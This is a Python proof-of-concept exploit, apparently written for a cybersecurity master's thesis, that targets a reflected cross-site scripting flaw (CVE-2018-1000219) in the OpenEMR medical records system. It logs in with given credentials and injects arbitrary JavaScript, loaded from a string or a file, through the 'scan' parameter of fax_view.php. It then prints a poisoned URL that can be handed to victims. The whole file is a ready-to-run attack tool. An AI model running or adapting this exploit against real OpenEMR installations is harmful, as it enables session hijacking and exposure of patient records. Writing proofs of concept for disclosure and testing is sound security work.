# TFM: 
# Center: IMF Master Cybersecurity Deloitte Online 
# Author: M3str3 <namestre3@protonmail.com>
# CVE-2018-1000219
# CVE Details: https://www.cvedetails.com/cve/CVE-2018-1000219/

import requests
import argparse
import urllib.parse

parser = argparse.ArgumentParser(description="Exploit XSS vulnerability in OpenEMR (CVE-2018-1000219)")
parser.add_argument('-t', '--target', help="Domain of the OpenEMR installation", required=True)
parser.add_argument('--ssl', action="store_true", help="Use http or https protocol")
parser.add_argument('--user', help="Username for authentication")
parser.add_argument('--password', help="Password for authentication")
parser.add_argument('--payload', default='alert("M3str3")', help="Path to JS file or JavaScript string")
args = parser.parse_args()

def load_payload(payload_path:str) -> str:
    """Load payload from a file or use the string directly."""
    try:
        with open(payload_path, 'r') as file:
            payload = file.read()
    except FileNotFoundError:
        payload = payload_path

    payload = payload.replace("<target>", args.target)
    payload = payload.replace("<ssl>", "https" if args.ssl else "http")
    return payload

def exploit_xss(payload:str) -> None:
    session = requests.Session()

    protocol = "https" if args.ssl else "http"
    
    url_login = f"{protocol}://{args.target}/interface/main/main_screen.php?auth=login&site=default"
    
    # Payload
    xss_payload_encoded = f"<script>{urllib.parse.quote(payload)}</script>"
    poisoned_url = f"{protocol}://{args.target}/interface/fax/fax_view.php?scan={xss_payload_encoded}&site=default"
    
    # Login & test case
    if args.user and args.password:
        
        login_data = {
            "new_login_session_management": 1,
            "authProvider": "Default",
            "authUser": args.user,
            "clearPass": args.password,
            "languageChoice": 1
        }
        
        # Perform login
        response_login = session.post(url_login, data=login_data)
        
        if response_login.url.endswith("login_screen.php"):
            print("[!] Login failed")
            return
        
        print("[*] Login successful")
        
        print("[*] Testing the payload...")
        response = session.get(poisoned_url)

        if payload in response.text:
            print("[*] XSS vulnerability successfully exploited !!!! ")
        else:
            print("[!] Failed to exploit the XSS vulnerability.")
        
        # Print the full response for debugging
        print(f"[*] Response: \n------\n{response.text}\n------")
    
    print(f"[*] Poisoned URL: {poisoned_url}")

if __name__ == "__main__":
    print("="*60)
    print(" " * 10 + "Proof of Concept - CVE-2018-1000219")
    print(" " * 10 + "IMF Master Cybersecurity Deloitte Online")
    print(" " * 10 + "Author: M3str3 <namestre3@protonmail.com>")
    print("="*60)

    payload = load_payload(args.payload)
    exploit_xss(payload)
